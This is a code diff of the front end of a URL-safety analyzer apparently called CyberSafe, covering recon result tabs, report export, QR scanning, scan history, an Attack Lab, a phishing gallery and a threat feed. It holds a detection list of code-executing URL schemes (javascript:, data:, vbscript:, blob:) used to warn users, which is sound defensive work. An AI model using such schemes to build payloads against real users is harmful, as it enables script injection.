+function renderReconTabTech(tech) { const panel = document.getElementById('recon-tab-tech'); if (!panel) return; const entries = Object.entries(tech); if (!entries.length) { panel.innerHTML = `<div class="recon-empty">No technology signals detected.</div>`; return; } panel.innerHTML = `<table class="recon-table">${entries.map(([k,v]) => `<tr><td class="recon-table-key">${escapeHTML(k)}</td><td class="recon-table-val font-mono">${escapeHTML(String(v))}</td></tr>`).join('')}</table>`; }
 
-function renderReconTabHTTP(http) {
-  const panel = document.getElementById('recon-tab-http');
-  if (!panel) return;
-  const rows = [
-    ['Status',       http.status_code || '—'],
-    ['Final URL',    http.final_url   || '—'],
-    ['Redirects',    http.redirect_count ?? '—'],
-    ['Content-Type', http.content_type || '—'],
-    ['Server',       http.server       || '—'],
-    ['Error',        http.error        || 'None'],
-  ];
-  let html = `<table class="recon-table">${rows.map(([k,v]) =>
-    `<tr><td class="recon-table-key">${escapeHTML(k)}</td><td class="recon-table-val font-mono">${escapeHTML(String(v))}</td></tr>`).join('')}</table>`;
-
-  if (http.redirects?.length > 1) {
-    html += `<div class="recon-redirect-chain"><div class="recon-section-title">Redirect Chain</div>`;
-    http.redirects.forEach((r, i) => {
-      html += `<div class="recon-redirect-hop">
-        <span class="recon-hop-num">${i+1}</span>
-        <span class="recon-hop-url font-mono">${escapeHTML(r.url)}</span>
-        <span class="recon-hop-status">${r.status}</span>
-      </div>`;
-    });
-    html += `</div>`;
-  }
-  panel.innerHTML = html;
-}
-
-function renderReconTabTLS(tls) {
-  const panel = document.getElementById('recon-tab-tls');
-  if (!panel) return;
-  if (!tls.enabled) {
-    panel.innerHTML = `<div class="recon-warning">⚠ TLS not enabled or could not be retrieved.<br>${escapeHTML(tls.error || tls.reason || '')}</div>`;
-    return;
-  }
-  const rows = [
-    ['Enabled',          tls.enabled ? 'Yes' : 'No'],
-    ['Version',          tls.version  || '—'],
-    ['Subject',          tls.subject  || '—'],
-    ['Issuer',           tls.issuer   || '—'],
-    ['Valid From',       tls.valid_from  || '—'],
-    ['Valid Until',      tls.valid_until || '—'],
-    ['Expired',          tls.expired === true ? '⚠ Yes' : tls.expired === false ? '✓ No' : '?'],
-    ['Days Remaining',   tls.days_remaining != null ? `${tls.days_remaining} days` : '—'],
-    ['Hostname Matches', tls.hostname_matches === true ? '✓ Yes' : tls.hostname_matches === false ? '✗ No' : '?'],
-  ];
-  panel.innerHTML = `<table class="recon-table">${rows.map(([k,v]) =>
-    `<tr><td class="recon-table-key">${escapeHTML(k)}</td><td class="recon-table-val font-mono">${escapeHTML(String(v))}</td></tr>`).join('')}</table>`;
-}
-
-function renderReconTabHeaders(headers) {
-  const panel = document.getElementById('recon-tab-headers');
-  if (!panel) return;
-  panel.innerHTML = Object.entries(headers).map(([name, info]) => `
-    <div class="recon-header-row ${info.present ? 'present' : 'missing'}">
-      <div class="recon-header-name">
-        <span class="recon-header-status">${info.present ? '✓' : '✗'}</span>
-        ${escapeHTML(name)}
-      </div>
-      ${info.present && info.value ? `<div class="recon-header-value font-mono">${escapeHTML(info.value)}</div>` : ''}
-      <div class="recon-header-desc">${escapeHTML(info.description || '')}</div>
-    </div>`).join('');
-}
-
-function renderReconTabCookies(cookies) {
-  const panel = document.getElementById('recon-tab-cookies');
-  if (!panel) return;
-  if (!cookies.length) {
-    panel.innerHTML = `<div class="recon-empty">No cookies found in response.</div>`;
-    return;
-  }
-  panel.innerHTML = cookies.map(c => `
-    <div class="recon-cookie-card">
-      <div class="recon-cookie-name font-mono">${escapeHTML(c.name)}</div>
-      <div class="recon-cookie-flags">
-        <span class="cookie-flag ${c.secure    ? 'ok' : 'warn'}">Secure: ${c.secure    ? '✓' : '✗'}</span>
-        <span class="cookie-flag ${c.http_only ? 'ok' : 'warn'}">HttpOnly: ${c.http_only ? '✓' : '✗'}</span>
-        <span class="cookie-flag ${c.same_site ? 'ok' : 'warn'}">SameSite: ${c.same_site ? escapeHTML(c.same_site) : '✗'}</span>
-      </div>
-      ${c.warnings.length ? `<div class="recon-cookie-warnings">${c.warnings.map(w => `<div class="recon-warning-item">⚠ ${escapeHTML(w)}</div>`).join('')}</div>` : ''}
-    </div>`).join('');
-}
-
-function renderReconTabTech(tech) {
-  const panel = document.getElementById('recon-tab-tech');
-  if (!panel) return;
-  const entries = Object.entries(tech);
-  if (!entries.length) {
-    panel.innerHTML = `<div class="recon-empty">No technology signals detected from public headers.</div>`;
-    return;
-  }
-  panel.innerHTML = `<table class="recon-table">${entries.map(([k,v]) =>
-    `<tr><td class="recon-table-key">${escapeHTML(k)}</td><td class="recon-table-val font-mono">${escapeHTML(String(v))}</td></tr>`).join('')}</table>`;
-}
-
-// ============================================================================
-// Terminal View
-// ============================================================================
 function buildTerminalOutput(recon) {
-  const t   = recon.target  || {};
-  const dns = recon.dns     || {};
-  const http = recon.http   || {};
-  const tls  = recon.tls    || {};
-  const risk = recon.risk   || {};
-  const hdr  = recon.headers || {};
-
-  const lines = [
-    `$ cybersafe recon ${t.hostname || '?'}`,
-    ``,
-    `[+] Target:      ${t.hostname || '?'}`,
-    `[+] Scheme:      ${(t.scheme || '').toUpperCase()}`,
-    `[+] Registered:  ${t.registered_domain || t.hostname || '?'}`,
-    ``,
-    `[DNS]`,
-    `[+] A:    ${(dns.A || []).map(r => r.value).join(', ') || 'no records'}`,
-    `[+] AAAA: ${(dns.AAAA || []).map(r => r.value).join(', ') || 'no records'}`,
-    `[+] MX:   ${(dns.MX || []).map(r => r.value).join(', ') || 'no records'}`,
-    ``,
-    `[HTTP]`,
-    `[+] Status:     ${http.status_code || '—'}`,
-    `[+] Final URL:  ${http.final_url || '—'}`,
-    `[+] Redirects:  ${http.redirect_count || 0}`,
-    ``,
-    `[TLS]`,
-    `[${tls.enabled ? '+' : '!'}] TLS:     ${tls.enabled ? 'ENABLED' : 'DISABLED'}`,
-    ...(tls.enabled ? [
-      `[${tls.expired ? '!' : '+'}] Expired: ${tls.expired ? 'YES' : 'NO'}`,
-      `[${tls.hostname_matches ? '+' : '!'}] Hostname Match: ${tls.hostname_matches ? 'YES' : 'NO'}`,
-    ] : []),
-    ``,
-    `[SECURITY HEADERS]`,
-    ...Object.entries(hdr).map(([name, info]) =>
-      `[${info.present ? '+' : '!'}] ${name}: ${info.present ? 'PRESENT' : 'MISSING'}`),
-    ``,
-    `[RISK]`,
-    `[${risk.score > 40 ? '!' : '+'}] Score: ${risk.score || 0}/100 (${risk.level || '?'})`,
-    ...(risk.indicators || []).map(i => `[!] ${i}`),
-    ``,
+  const t = recon.target || {}; const dns = recon.dns || {}; const http = recon.http || {};
+  const tls = recon.tls || {}; const risk = recon.risk || {}; const hdr = recon.headers || {};
+  return [
+    `$ cybersafe recon ${t.hostname || '?'}`, ``,
+    `[+] Target:      ${t.hostname || '?'}`, `[+] Scheme:      ${(t.scheme || '').toUpperCase()}`, ``,
+    `[DNS]`, `[+] A:    ${(dns.A || []).map(r => r.value).join(', ') || 'no records'}`, ``,
+    `[HTTP]`, `[+] Status:     ${http.status_code || '—'}`, `[+] Final URL:  ${http.final_url || '—'}`, ``,
+    `[TLS]`, `[${tls.enabled ? '+' : '!'}] TLS:     ${tls.enabled ? 'ENABLED' : 'DISABLED'}`, ``,
+    `[SECURITY HEADERS]`, ...Object.entries(hdr).map(([name, info]) => `[${info.present ? '+' : '!'}] ${name}: ${info.present ? 'PRESENT' : 'MISSING'}`), ``,
+    `[RISK]`, `[${risk.score > 40 ? '!' : '+'}] Score: ${risk.score || 0}/100 (${risk.level || '?'})`,
+    ...(risk.indicators || []).map(i => `[!] ${i}`), ``,
     `[+] Completed: ${recon.timestamp || new Date().toISOString()}`,
-  ];
-  return lines.join('\n');
+  ].join('\n');
 }
 
 // ============================================================================
-// Phase 12: Security Report Export
+// Security Report Export
 // ============================================================================
 function exportReport() {
   const a = window._lastAnalysis;
@@ -768,251 +652,556 @@ function exportReport() {
   ];
 
   (a.findings || []).forEach((f, i) => {
-    lines.push(`  ${i + 1}. [${f.severity.toUpperCase()}] ${f.title}`);
+    lines.push(`  ${i + 1}. [${f.severity.toUpperCase()}] ${f.title} (+${f.score})`);
     lines.push(`     ${f.message}`);
     if (f.evidence) lines.push(`     Evidence: ${f.evidence}`);
   });
 
   lines.push('───────────────────────────────────────────');
-  lines.push('  ANALYSIS MODE: Offline — no destination requests were made.');
-  lines.push('  CyberSafe analyzes URL structure only. SAFE does not');
-  lines.push('  guarantee the destination is safe.');
+  lines.push('  This URL was analyzed as text.');
+  lines.push('  CyberSafe did not visit or fetch the destination.');
   lines.push('═══════════════════════════════════════════');
 
   const report = lines.join('\n');
-
-  // Copy to clipboard
   const btn = document.getElementById('export-report-btn');
   navigator.clipboard.writeText(report).then(() => {
-    if (btn) {
-      const original = btn.textContent;
-      btn.textContent = '✓ Copied!';
-      setTimeout(() => { btn.textContent = original; }, 2000);
-    }
-  }).catch(() => {
-    // Fallback: show in a pre element
-    showReportFallback(report);
-  });
+    if (btn) { const orig = btn.innerHTML; btn.textContent = '✓ Copied!'; setTimeout(() => { btn.innerHTML = orig; if (typeof lucide !== 'undefined') lucide.createIcons(); }, 2000); }
+  }).catch(() => { showReportFallback(report); });
 }
 
 function showReportFallback(report) {
   let modal = document.getElementById('report-modal');
   if (!modal) {
-    modal = document.createElement('div');
-    modal.id = 'report-modal';
-    modal.className = 'report-modal';
-    modal.innerHTML = `
-      <div class="report-modal-content glass-card">
-        <div class="card-header">
-          <h3><i data-lucide="file-text"></i> Security Report</h3>
-          <button class="btn-icon" onclick="document.getElementById('report-modal').classList.add('hidden')"><i data-lucide="x"></i></button>
-        </div>
-        <pre id="report-text" class="report-pre font-mono"></pre>
-        <p class="report-hint">Select all (Ctrl+A) and copy manually.</p>
-      </div>`;
-    document.body.appendChild(modal);
-    if (typeof lucide !== 'undefined') lucide.createIcons();
+    modal = document.createElement('div'); modal.id = 'report-modal'; modal.className = 'report-modal';
+    modal.innerHTML = `<div class="report-modal-content glass-card"><div class="card-header"><h3><i data-lucide="file-text"></i> Security Report</h3><button class="btn-icon" onclick="document.getElementById('report-modal').classList.add('hidden')"><i data-lucide="x"></i></button></div><pre id="report-text" class="report-pre font-mono"></pre><p class="report-hint">Select all (Ctrl+A) and copy manually.</p></div>`;
+    document.body.appendChild(modal); if (typeof lucide !== 'undefined') lucide.createIcons();
   }
   document.getElementById('report-text').textContent = report;
   modal.classList.remove('hidden');
 }
 
 // ============================================================================
-// Phase 10: QR Code Scanner — content type detection
+// QR Code Scanner
 // ============================================================================
 const WEB_SCHEMES = ['http:', 'https:'];
 const DANGEROUS_SCHEMES = ['javascript:', 'data:', 'vbscript:', 'blob:'];
 
 function detectQRPayloadType(text) {
-  try {
-    const url = new URL(text);
-    if (DANGEROUS_SCHEMES.includes(url.protocol)) return 'dangerous';
-    if (WEB_SCHEMES.includes(url.protocol)) return 'web';
-    return 'app-link'; // tel:, mailto:, sms:, etc.
-  } catch {
-    // Not a URL
-    if (/^https?:\/\//i.test(text)) return 'web';
-    if (/^[A-Za-z][A-Za-z0-9+\-.]*:/.test(text)) return 'app-link';
-    return 'text';
-  }
+  try { const url = new URL(text); if (DANGEROUS_SCHEMES.includes(url.protocol)) return 'dangerous'; if (WEB_SCHEMES.includes(url.protocol)) return 'web'; return 'app-link'; }
+  catch { if (/^https?:\/\//i.test(text)) return 'web'; if (/^[A-Za-z][A-Za-z0-9+\-.]*:/.test(text)) return 'app-link'; return 'text'; }
 }
 
 function handleQRResult(text) {
   closeQRScanner();
   const type = detectQRPayloadType(text);
   urlInput.value = text;
-
-  if (type === 'dangerous') {
-    showQRWarning('⚠ DANGEROUS PAYLOAD', `Detected scheme: ${text.split(':')[0]}:`, 'This payload can execute code in your browser. Do NOT click or paste it into a browser address bar. CyberSafe has loaded it for analysis only.', 'dangerous');
-    return;
-  }
-  if (type === 'text') {
-    showQRWarning('📄 NON-URL PAYLOAD', 'Plain text detected', 'This QR code contains plain text, not a URL. It has been loaded into the analyzer for inspection.', 'info');
-    return;
-  }
-  if (type === 'app-link') {
-    showQRWarning('⚠ NON-WEB PAYLOAD', `Detected scheme: ${text.split(':')[0]}:`, 'This QR code uses a non-web scheme. Review carefully before following any link.', 'warn');
-    return;
-  }
-
-  // Web URL — auto-analyze
+  if (type === 'dangerous') { showQRWarning('⚠ DANGEROUS PAYLOAD', `Detected scheme: ${text.split(':')[0]}:`, 'This payload can execute code in your browser. Do NOT click or paste it.', 'dangerous'); return; }
+  if (type === 'text') { showQRWarning('📄 NON-URL PAYLOAD', 'Plain text detected', 'This QR code contains plain text, not a URL.', 'info'); return; }
+  if (type === 'app-link') { showQRWarning('⚠ NON-WEB PAYLOAD', `Detected scheme: ${text.split(':')[0]}:`, 'This QR code uses a non-web scheme.', 'warn'); return; }
   setTimeout(() => {
-    setMode('offline');
-    hideError();
-    hideResults();
-    showLoading('Analyzing URL structure...');
+    setMode('offline'); hideError(); hideResults(); showLoading('Analyzing URL structure...');
     handleAnalyze(text).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading());
   }, 300);
 }
 
 function showQRWarning(title, subtitle, message, level) {
-  const existing = document.getElementById('qr-payload-warning');
-  if (existing) existing.remove();
-
-  const el = document.createElement('div');
-  el.id = 'qr-payload-warning';
-  el.className = `qr-payload-warning qr-warning--${level}`;
-  el.innerHTML = `
-    <div class="qr-warning-header">
-      <span class="qr-warning-title">${escapeHTML(title)}</span>
-      <button class="btn-icon" onclick="document.getElementById('qr-payload-warning').remove()"><i data-lucide="x"></i></button>
-    </div>
-    <div class="qr-warning-subtitle font-mono">${escapeHTML(subtitle)}</div>
-    <div class="qr-warning-message">${escapeHTML(message)}</div>
-    ${level !== 'info' ? `<button class="btn btn-primary" style="margin-top:0.75rem;width:100%" onclick="document.getElementById('qr-payload-warning').remove(); document.getElementById('analyze-form').dispatchEvent(new Event('submit'))">Analyze Anyway</button>` : ''}
-  `;
-
-  const inputCard = document.querySelector('.input-card');
-  if (inputCard) inputCard.insertAdjacentElement('afterend', el);
-  else form.insertAdjacentElement('afterend', el);
+  const existing = document.getElementById('qr-payload-warning'); if (existing) existing.remove();
+  const el = document.createElement('div'); el.id = 'qr-payload-warning'; el.className = `qr-payload-warning qr-warning--${level}`;
+  el.innerHTML = `<div class="qr-warning-header"><span class="qr-warning-title">${escapeHTML(title)}</span><button class="btn-icon" onclick="document.getElementById('qr-payload-warning').remove()"><i data-lucide="x"></i></button></div><div class="qr-warning-subtitle font-mono">${escapeHTML(subtitle)}</div><div class="qr-warning-message">${escapeHTML(message)}</div>${level !== 'info' ? `<button class="btn btn-primary" style="margin-top:0.75rem;width:100%" onclick="document.getElementById('qr-payload-warning').remove(); document.getElementById('analyze-form').dispatchEvent(new Event('submit'))">Analyze Anyway</button>` : ''}`;
+  const inputCard = document.querySelector('.input-card'); if (inputCard) inputCard.insertAdjacentElement('afterend', el); else form.insertAdjacentElement('afterend', el);
   if (typeof lucide !== 'undefined') lucide.createIcons();
 }
 
-function toggleQRScanner() {
-  qrReaderContainer.classList.contains('hidden') ? openQRScanner() : closeQRScanner();
-}
-
+function toggleQRScanner() { qrReaderContainer.classList.contains('hidden') ? openQRScanner() : closeQRScanner(); }
 function openQRScanner() {
   qrReaderContainer.classList.remove('hidden');
   if (!qrScanner && typeof Html5Qrcode !== 'undefined') {
     qrScanner = new Html5Qrcode('qr-reader');
-    qrScanner.start(
-      { facingMode: 'environment' },
-      { fps: 10, qrbox: { width: 250, height: 250 } },
-      text => handleQRResult(text),
-      () => {}
-    ).catch(() => { showError('QR Scanner Error', 'Could not access camera. Please check permissions.'); closeQRScanner(); });
+    qrScanner.start({ facingMode: 'environment' }, { fps: 10, qrbox: { width: 250, height: 250 } }, text => handleQRResult(text), () => {}).catch(() => { showError('QR Scanner Error', 'Could not access camera.'); closeQRScanner(); });
   }
 }
-
-function closeQRScanner() {
-  qrReaderContainer.classList.add('hidden');
-  if (qrScanner) {
-    qrScanner.stop().then(() => { qrScanner.clear(); qrScanner = null; }).catch(() => {});
-  }
-}
+function closeQRScanner() { qrReaderContainer.classList.add('hidden'); if (qrScanner) { qrScanner.stop().then(() => { qrScanner.clear(); qrScanner = null; }).catch(() => {}); } }
 
 // ============================================================================
-// History — Phase 11: timestamp, score, finding count, search
+// History
 // ============================================================================
-function loadHistoryFromStorage() {
-  try { scanHistory = JSON.parse(localStorage.getItem('cybersafe_history') || '[]'); }
-  catch { scanHistory = []; }
-}
-function saveHistoryToStorage() {
-  try { localStorage.setItem('cybersafe_history', JSON.stringify(scanHistory)); } catch {}
-}
-function addToHistory(item) {
-  scanHistory.unshift(item);
-  if (scanHistory.length > 50) scanHistory = scanHistory.slice(0, 50);
-  saveHistoryToStorage();
-  renderHistory();
-}
+function loadHistoryFromStorage() { try { scanHistory = JSON.parse(localStorage.getItem('cybersafe_history') || '[]'); } catch { scanHistory = []; } }
+function saveHistoryToStorage() { try { localStorage.setItem('cybersafe_history', JSON.stringify(scanHistory)); } catch {} }
+function addToHistory(item) { scanHistory.unshift(item); if (scanHistory.length > 50) scanHistory = scanHistory.slice(0, 50); saveHistoryToStorage(); renderHistory(); renderFullHistory(); }
 
 function formatTimestamp(ts) {
   if (!ts) return '';
-  try {
-    const d = new Date(ts);
-    const now = new Date();
-    const diffMs = now - d;
-    const diffMin = Math.floor(diffMs / 60000);
-    if (diffMin < 1) return 'just now';
-    if (diffMin < 60) return `${diffMin}m ago`;
-    const diffHr = Math.floor(diffMin / 60);
-    if (diffHr < 24) return `${diffHr}h ago`;
-    return d.toLocaleDateString();
-  } catch { return ''; }
+  try { const d = new Date(ts); const now = new Date(); const diffMin = Math.floor((now - d) / 60000); if (diffMin < 1) return 'just now'; if (diffMin < 60) return `${diffMin}m ago`; const diffHr = Math.floor(diffMin / 60); if (diffHr < 24) return `${diffHr}h ago`; return d.toLocaleDateString(); } catch { return ''; }
 }
 
 function renderHistory(filter) {
-  const items = filter
-    ? scanHistory.filter(i => i.url && i.url.toLowerCase().includes(filter.toLowerCase()))
-    : scanHistory;
-
-  if (!items.length) {
-    emptyHistory.classList.remove('hidden');
-    historyList.querySelectorAll('.history-item').forEach(el => el.remove());
-    return;
-  }
+  const items = filter ? scanHistory.filter(i => i.url && i.url.toLowerCase().includes(filter.toLowerCase())) : scanHistory;
+  if (!items.length) { emptyHistory.classList.remove('hidden'); historyList.querySelectorAll('.history-item').forEach(el => el.remove()); return; }
   emptyHistory.classList.add('hidden');
-  const existingItems = historyList.querySelectorAll('.history-item');
-  existingItems.forEach(el => el.remove());
-
+  historyList.querySelectorAll('.history-item').forEach(el => el.remove());
   const fragment = document.createDocumentFragment();
   items.forEach((item, i) => {
-    const el = document.createElement('div');
-    el.className = 'history-item';
-    el.setAttribute('data-index', String(i));
-    el.setAttribute('title', item.url || '');
-    el.innerHTML = `
-      <div class="history-item-top">
-        <span class="history-verdict ${escapeHTML(item.verdict)}">${escapeHTML(item.verdict)}</span>
-        <span class="history-meta font-mono">
-          ${item.score != null ? `<span class="history-score">${item.score}</span>` : ''}
-          ${item.findingCount != null ? `<span class="history-findings">${item.findingCount} ${item.findingCount === 1 ? 'finding' : 'findings'}</span>` : ''}
-          ${item.mode === 'recon' ? '<span class="history-mode-badge">RECON</span>' : ''}
-        </span>
-      </div>
-      <div class="history-item-bottom">
-        <span class="history-url">${escapeHTML(item.url || '')}</span>
-        <span class="history-time">${escapeHTML(formatTimestamp(item.timestamp))}</span>
-      </div>`;
-    el.addEventListener('click', () => {
-      const orig = scanHistory[i];
-      if (orig) { urlInput.value = orig.url; urlInput.focus(); }
-    });
+    const el = document.createElement('div'); el.className = 'history-item'; el.setAttribute('title', item.url || '');
+    el.innerHTML = `<div class="history-item-top"><span class="history-verdict ${escapeHTML(item.verdict)}">${escapeHTML(item.verdict)}</span><span class="history-meta font-mono">${item.score != null ? `<span class="history-score">${item.score}</span>` : ''}${item.findingCount != null ? `<span class="history-findings">${item.findingCount} ${item.findingCount === 1 ? 'finding' : 'findings'}</span>` : ''}${item.mode === 'recon' ? '<span class="history-mode-badge">RECON</span>' : ''}</span></div><div class="history-item-bottom"><span class="history-url">${escapeHTML(item.url || '')}</span><span class="history-time">${escapeHTML(formatTimestamp(item.timestamp))}</span></div>`;
+    el.addEventListener('click', () => { urlInput.value = scanHistory[i]?.url || ''; urlInput.focus(); switchToTab('scan'); });
     fragment.appendChild(el);
   });
   historyList.appendChild(fragment);
 }
 
-function clearHistory() {
-  scanHistory = []; saveHistoryToStorage(); renderHistory();
-}
+function clearHistory() { scanHistory = []; saveHistoryToStorage(); renderHistory(); renderFullHistory(); }
 
 // ============================================================================
 // UI State Helpers
 // ============================================================================
-function showLoading(msg) {
-  if (loadingText) loadingText.textContent = msg || 'Analyzing URL structure...';
-  loadingState.classList.remove('hidden');
-  analyzeBtn.disabled = true;
-}
-function hideLoading() {
-  loadingState.classList.add('hidden');
-  analyzeBtn.disabled = false;
-}
-function showError(title, msg) {
-  errorTitle.textContent   = title;
-  errorMessage.textContent = msg;
-  errorState.classList.remove('hidden');
-}
-function hideError()   { errorState.classList.add('hidden'); }
+function showLoading(msg) { if (loadingText) loadingText.textContent = msg || 'Analyzing URL structure...'; loadingState.classList.remove('hidden'); analyzeBtn.disabled = true; }
+function hideLoading() { loadingState.classList.add('hidden'); analyzeBtn.disabled = false; }
+function showError(title, msg) { errorTitle.textContent = title; errorMessage.textContent = msg; errorState.classList.remove('hidden'); }
+function hideError() { errorState.classList.add('hidden'); }
 function hideResults() { resultsContainer.classList.add('hidden'); }
-function showResults(mode) {
-  resultsContainer.classList.remove('hidden');
-  offlineResults.classList.toggle('hidden', mode !== 'offline');
-  reconResults.classList.toggle('hidden',   mode !== 'recon');
+function showResults(mode) { resultsContainer.classList.remove('hidden'); offlineResults.classList.toggle('hidden', mode !== 'offline'); reconResults.classList.toggle('hidden', mode !== 'recon'); }
+
+// ============================================================================
+// ATTACK LAB
+// ============================================================================
+function initAttackLab() {
+  renderAttackLabGrid(ATTACK_LABS);
+
+  // Search
+  const search = document.getElementById('attack-lab-search');
+  if (search) {
+    search.addEventListener('input', () => filterAttackLabs());
+  }
+
+  // Filter buttons
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      filterAttackLabs();
+    });
+  });
+
+  // Close result panel
+  const closeBtn = document.getElementById('close-lab-result');
+  if (closeBtn) closeBtn.addEventListener('click', () => { document.getElementById('attack-lab-result').classList.add('hidden'); });
+
+  // Run Again
+  const runAgain = document.getElementById('lab-run-again');
+  if (runAgain) runAgain.addEventListener('click', () => {
+    const url = document.getElementById('lab-example-url').textContent;
+    if (url) runAttackLab(url);
+  });
+
+  // View Full Analysis
+  const viewFull = document.getElementById('lab-view-full');
+  if (viewFull) viewFull.addEventListener('click', () => {
+    const url = document.getElementById('lab-example-url').textContent;
+    if (url) { urlInput.value = url; switchToTab('scan'); setMode('offline'); hideError(); hideResults(); showLoading('Analyzing URL structure...'); handleAnalyze(url).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading()); }
+  });
+}
+
+function filterAttackLabs() {
+  const search = (document.getElementById('attack-lab-search')?.value || '').toLowerCase();
+  const category = document.querySelector('.filter-btn.active')?.getAttribute('data-filter') || 'ALL';
+
+  const filtered = ATTACK_LABS.filter(lab => {
+    const matchSearch = !search || lab.name.toLowerCase().includes(search) || lab.desc.toLowerCase().includes(search) || lab.category.toLowerCase().includes(search);
+    const matchCategory = category === 'ALL' || lab.category === category;
+    return matchSearch && matchCategory;
+  });
+
+  renderAttackLabGrid(filtered);
+}
+
+function renderAttackLabGrid(labs) {
+  const grid = document.getElementById('attack-lab-grid');
+  if (!grid) return;
+
+  // Group by category
+  const categories = {};
+  labs.forEach(lab => {
+    if (!categories[lab.category]) categories[lab.category] = [];
+    categories[lab.category].push(lab);
+  });
+
+  const categoryNames = { DECEPTION: 'URL Deception', PAYLOAD: 'Dangerous Payloads', NETWORK: 'Host & Network', PHISHING: 'Phishing Patterns', STRUCTURE: 'URL Structure' };
+
+  grid.innerHTML = Object.entries(categories).map(([cat, catLabs]) => `
+    <div class="lab-category">
+      <h4 class="lab-category-title">${escapeHTML(categoryNames[cat] || cat)}</h4>
+      <div class="lab-category-grid">
+        ${catLabs.map(lab => `
+          <button class="attack-lab-btn" onclick="runAttackLab('${escapeHTML(lab.url).replace(/'/g, "\\'")}')" data-lab-id="${lab.id}">
+            <div class="attack-lab-icon">${lab.icon}</div>
+            <div class="attack-lab-info">
+              <strong>${escapeHTML(lab.name)}</strong>
+              <span>${escapeHTML(lab.desc)}</span>
+            </div>
+          </button>
+        `).join('')}
+      </div>
+    </div>
+  `).join('');
+
+  if (!labs.length) {
+    grid.innerHTML = '<div class="empty-state"><p>No techniques match your search.</p></div>';
+  }
+}
+
+async function runAttackLab(url) {
+  const resultPanel = document.getElementById('attack-lab-result');
+  const lab = ATTACK_LABS.find(l => l.url === url);
+
+  document.getElementById('lab-result-title').textContent = lab ? `Attack Lab — ${lab.name}` : 'Attack Lab Result';
+  document.getElementById('lab-example-url').textContent = url;
+  document.getElementById('lab-verdict').textContent = 'Analyzing...';
+  document.getElementById('lab-score').textContent = '—';
+  document.getElementById('lab-explanation').textContent = lab ? lab.concept : 'Analyzing...';
+
+  resultPanel.classList.remove('hidden');
+  resultPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+
+  try {
+    const response = await fetch(API.analyze, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url }),
+    });
+    const data = await response.json();
+    if (data.success && data.analysis) {
+      const a = data.analysis;
+      const verdictEl = document.getElementById('lab-verdict');
+      verdictEl.textContent = a.verdict;
+      verdictEl.className = `verdict-value verdict-${a.verdict.toLowerCase()}`;
+      document.getElementById('lab-score').textContent = `${a.score} / 100`;
+
+      // Build explanation with findings
+      let explanation = lab ? lab.concept + '\n\n' : '';
+      if (a.findings && a.findings.length) {
+        explanation += 'Detected Rules:\n';
+        a.findings.forEach(f => { explanation += `• ${f.title} [${f.severity.toUpperCase()}] (+${f.score})\n`; });
+      }
+      explanation += `\nRecommendation: ${a.recommendation || ''}`;
+      document.getElementById('lab-explanation').textContent = explanation;
+    }
+  } catch (err) {
+    document.getElementById('lab-verdict').textContent = 'ERROR';
+    document.getElementById('lab-explanation').textContent = 'Could not reach the analysis server. ' + getReadableError(err);
+  }
+
+  if (typeof lucide !== 'undefined') lucide.createIcons();
+}
+window.runAttackLab = runAttackLab;
+
+// ============================================================================
+// PHISHING GALLERY
+// ============================================================================
+function initPhishingGallery() {
+  const grid = document.getElementById('phishing-gallery-grid');
+  if (!grid) return;
+
+  grid.innerHTML = PHISHING_GALLERY.map((item, i) => `
+    <div class="gallery-card">
+      <div class="gallery-card-header">
+        <h4>${escapeHTML(item.technique)}</h4>
+      </div>
+      <div class="gallery-card-body">
+        <div class="gallery-field">
+          <span class="gallery-label">Example</span>
+          <code class="gallery-code font-mono">${escapeHTML(item.example)}</code>
+        </div>
+        <div class="gallery-field">
+          <span class="gallery-label">What the user sees</span>
+          <span class="gallery-text">${escapeHTML(item.userSees)}</span>
+        </div>
+        <div class="gallery-field">
+          <span class="gallery-label">What the URL actually contains</span>
+          <span class="gallery-text gallery-text--warn">${escapeHTML(item.actualContent)}</span>
+        </div>
+        <div class="gallery-field">
+          <span class="gallery-label">Why it matters</span>
+          <span class="gallery-text">${escapeHTML(item.whyMatters)}</span>
+        </div>
+        <div class="gallery-field">
+          <span class="gallery-label">CyberSafe Detection</span>
+          <span class="gallery-text gallery-text--detection">${escapeHTML(item.detection)}</span>
+        </div>
+        <div class="gallery-field">
+          <span class="gallery-label">How to stay safe</span>
+          <span class="gallery-text gallery-text--safe">${escapeHTML(item.howToStay)}</span>
+        </div>
+      </div>
+      <button class="btn btn-primary gallery-analyze-btn" onclick="analyzeGalleryItem('${escapeHTML(item.example).replace(/'/g, "\\'")}')">
+        <i data-lucide="search"></i> Analyze This Example
+      </button>
+    </div>
+  `).join('');
+
+  if (typeof lucide !== 'undefined') lucide.createIcons();
+}
+
+function analyzeGalleryItem(url) {
+  urlInput.value = url;
+  switchToTab('scan');
+  setMode('offline');
+  hideError();
+  hideResults();
+  showLoading('Analyzing URL structure...');
+  handleAnalyze(url).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading());
+}
+window.analyzeGalleryItem = analyzeGalleryItem;
+
+// ============================================================================
+// THREAT FEED
+// ============================================================================
+function initThreatFeed() {
+  const list = document.getElementById('threat-feed-list');
+  if (!list) return;
+
+  list.innerHTML = DEMO_THREATS.map(threat => {
+    const severityClass = { CRITICAL: 'suspicious', HIGH: 'suspicious', MEDIUM: 'review', LOW: 'safe' }[threat.severity] || 'review';
+    return `
+    <div class="threat-card">
+      <div class="threat-header">
+        <span class="threat-type">${escapeHTML(threat.type)}</span>
+        <span class="severity-badge ${severityClass}">${escapeHTML(threat.severity)}</span>
+      </div>
+      <div class="threat-indicator font-mono">${escapeHTML(threat.indicator)}</div>
+      <div class="threat-meta">
+        <span class="threat-category">${escapeHTML(threat.category)}</span>
+        <span class="threat-source">Source: ${escapeHTML(threat.source)}</span>
+        <span class="threat-time">${new Date(threat.timestamp).toLocaleString()}</span>
+      </div>
+      <button class="btn btn-secondary threat-analyze-btn" onclick="analyzeGalleryItem('${escapeHTML(threat.indicator).replace(/'/g, "\\'")}')">
+        <i data-lucide="search"></i> Analyze Indicator
+      </button>
+    </div>`;
+  }).join('');
+
+  if (typeof lucide !== 'undefined') lucide.createIcons();
+}
+
+// ============================================================================
+// URL COMPARISON
+// ============================================================================
+function initURLComparison() {
+  const btn = document.getElementById('compare-urls-btn');
